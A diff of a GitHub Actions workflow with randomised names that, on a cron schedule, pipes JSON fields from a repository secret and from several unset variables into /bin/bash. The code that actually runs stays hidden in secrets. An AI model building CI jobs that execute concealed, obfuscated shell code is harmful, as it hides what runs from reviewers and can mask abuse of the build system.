@@ -1,27 +1,25 @@
 name: hantao19871010
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '47 4/6 * * *'
+    - cron: '40 2/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: hantao19871010
         env:
-          tk7: ${{ secrets.tk7 }}
+          abkb26: ${{ secrets.abkb26 }}
         run: |
-          echo $tk7 | jq -r .apny298 | /bin/bash
-          echo $qr91227 | jq -r .jkzj41920 | /bin/bash
-          echo $qrb2 | jq -r .dlswc1883 | /bin/bash
-          echo $ohn3 | jq -r .nhov4377 | /bin/bash
-          echo $ltql088 | jq -r .tp7 | /bin/bash
-          echo $o89903 | jq -r .cmyk115 | /bin/bash
-          echo $vcmw2 | jq -r .gumw8324 | /bin/bash
-          echo $axw60818 | jq -r .tl745 | /bin/bash
-          echo $mh1591 | jq -r .g0 | /bin/bash
-          echo $p5317 | jq -r .j00196 | /bin/bash
+          echo $abkb26 | jq -r .my22870 | /bin/bash
+          echo $sau6 | jq -r .fmdde9 | /bin/bash
+          echo $scncn95 | jq -r .tp19564 | /bin/bash
+          echo $rxdrk83782 | jq -r .vg59407 | /bin/bash
+          echo $f70824 | jq -r .yxxk7 | /bin/bash
+          echo $d7378 | jq -r .dmsj69443 | /bin/bash
+          echo $rbjzm170 | jq -r .jwbv52 | /bin/bash
+          echo $xjrst516 | jq -r .dym43501 | /bin/bash
+          echo $omi92 | jq -r .bkq30284 | /bin/bash
+          echo $uhfmn62287 | jq -r .slz8 | /bin/bash
 
